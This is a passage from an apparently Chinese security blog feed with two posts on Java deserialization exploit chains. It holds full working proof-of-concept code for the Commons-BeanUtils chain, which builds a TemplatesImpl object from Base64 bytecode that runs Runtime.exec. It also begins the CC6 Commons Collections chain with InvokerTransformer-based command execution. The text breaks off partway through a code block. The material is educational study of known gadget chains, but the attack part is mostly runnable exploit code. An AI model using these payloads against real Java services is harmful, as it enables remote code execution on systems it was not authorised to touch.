class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>]=templates;</span><br><span class="line">        queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object o=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/df850557/image-20250917212917144.png" alt="image-20250917212917144"></p><p>可是报错了并没有弹出计算机</p><p>这是因为中间我们调用了add方法，而在add方法中我们传入的是1，为Integer对象：</p><p><img src="/archives/df850557/image-20250917214407521.png" alt="image-20250917214407521"></p><p>而在add调用的offer方法中会调用siftUp(i,e)，而e就是我们的Integer对象：</p><p><img src="/archives/df850557/image-20250917214421868.png" alt="image-20250917214421868"></p><p>之后执行siftUpUsingComparator方法，其中x就为传入的e，即Integer对象：</p><p><img src="/archives/df850557/image-20250917214449375.png" alt="image-20250917214449375"></p><p>最后执行<code>comparator.compare(x,(E) e)</code>，这个逻辑跟我们要执行的链子很类似，为了防止add的影响ysoserial中是<strong>先传入假的参数再通过反射修改</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>); <span class="comment">//不能传入字符串</span></span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">       setValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>还有一点需要注意的是由于在add方法中是调用：</p><p><img src="/archives/df850557/image-20250917215417295.png" alt="image-20250917215417295"></p><p>此时o1,o2为Integer对象，而如果this.property为<code>B1uel0n3</code>字符串则会导致报错，所以我们实例化BeanComparator对象时设置this.property为空就行</p><p>最终POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>]=templates;</span><br><span class="line">        queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object o=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/df850557/image-20250917215712040.png" alt="image-20250917215712040"></p><p>成功弹计算机</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CB链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC6利用链深度解析</title>
      <link href="/archives/7db87f98/"/>
      <url>/archives/7db87f98/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u71</strong></li><li><strong>Commons Collection 3.2.1</strong></li></ul><p>jdk下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox</a></p><p>具体搭建流程与CC1链是一样的，可以看我之前的<a href="https://b1uel0n3.github.io/2025/06/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9ACC1%E5%88%A9%E7%94%A8%E9%93%BE%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">文章</a>。注意CC6对jdk是不受版本限制的，所以任意版本都行，但Commons Collection版本要小于等于3.2.1</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>回顾<a href="https://b1uel0n3.github.io/2025/06/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9ACC1%E5%88%A9%E7%94%A8%E9%93%BE%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">CC1</a>：</p><ol><li>TransformedMap链中，我们是先通过<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>类中的readObject方法，然后foreach语句会执行Map遍历，执行**memberValues.setValue()<strong>方法，从而调用</strong>MapEntry.setValue()<strong>，然后执行</strong>TransformedMap.checkSetValue()**来触发ChainedTransformer的transform方法。</li><li>而在LazyMap链中，则是在foreach语句执行<strong>memberValues.entrySet()<strong>，此时会相当于调用代理对象触发</strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>类中的**invoke()<strong>方法，然后调用</strong>LazyMap.get()**方法来触发ChainedTransformer的transform方法。</li></ol><p>但自从Java 8u71以后，官方修改了AnnotationInvocationHandler类中的readObject方法，修改后的代码可以看到不再使用我们原始的Map对象，而是新建了LinkedHashMap对象，并将键值对加入，使得后续操作都是针对于这个新的LinkedHashMap对象，使得无法触发**LazyMap.get()<strong>方法，且新的方法也没有了</strong>memberValues.setValue()**了，可以说TransformedMap链没法用了。</p><p>所以我们就思考能否找到一条不经过AnnotationInvocationHandler类且能够触发LazyMap.get()方法的链子呢？</p><h2 id="CC6分析"><a href="#CC6分析" class="headerlink" title="CC6分析"></a>CC6分析</h2><h3 id="HashMap链分析"><a href="#HashMap链分析" class="headerlink" title="HashMap链分析"></a>HashMap链分析</h3><p>通过搜索，恰好发现TiedMapEntry中的getValue()方法能调用map.get()，而且map是可控的：<br><img src="/archives/7db87f98/image-20250620143155790-175245714842391.png" alt="image-20250620143155790"></p><p><img src="/archives/7db87f98/image-20250620143222260-175245714842392.png" alt="image-20250620143222260"></p><p>那么我们就能通过getValue()来调用LazyMap.get()，搜索getValue()看哪些方法调用了它：</p><p><img src="/archives/7db87f98/image-20250620143716755-175245714842393.png" alt="image-20250620143716755"></p><p>发现该类中hashCode方法可以调用它，那么就好办了，hashCode方法我们并不陌生，URLDNS链就是利用HashMap的readObject方法调用putVal()方法，然后调用hash(key)，最后调用key.hashCode()方法：<br><img src="/archives/7db87f98/image-20250620144427475-175245714842394.png" alt="image-20250620144427475"></p><p><img src="/archives/7db87f98/image-20250620144444981-175245714842395.png" alt="image-20250620144444981"></p><p>所以我想着试一下能否可行，先通过TiedMapEntry.getValue()调用LazyMap.get():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(map, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/7db87f98/image-20250620152655644-175245714842396.png" alt="image-20250620152655644"></p><p>然后通过HashMap.readObject()调用TiedMapEntry.hashCode从而调用TiedMapEntry.getValue，而readObject中key是我们可控的，我们可以通过put()方法传入key：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure><p>但这里有个问题，学过URLDNS链的师傅都知道，Map.put()方法也是会调用hashCode()方法的：</p><p><img src="/archives/7db87f98/image-20250620154646611-175245714842397.png" alt="image-20250620154646611"></p><p>跟HashMap.readObject()调用的方式是一样的，所以执行到这时不用反序列化也能触发TiedMapEntry.hashCode方法弹计算机：</p><p><img src="/archives/7db87f98/image-20250620155118956-175245714842398.png" alt="image-20250620155118956"></p><p>而当最后执行反序列化时：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span 